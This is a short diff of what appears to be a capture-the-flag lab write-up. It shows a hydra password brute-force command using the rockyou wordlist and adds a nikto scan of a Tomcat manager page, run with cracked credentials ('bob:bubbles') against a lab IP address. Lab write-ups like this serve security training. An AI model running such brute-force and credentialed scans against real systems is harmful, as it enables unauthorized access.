@@ -60,7 +60,7 @@ hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.219.157 http-get /protect
 
 Using Nikto with creds
 ```
-
+nikto -id bob:bubbles -h http://10.10.219.157:1234/manager/html
 ```
 
 username=tomcat
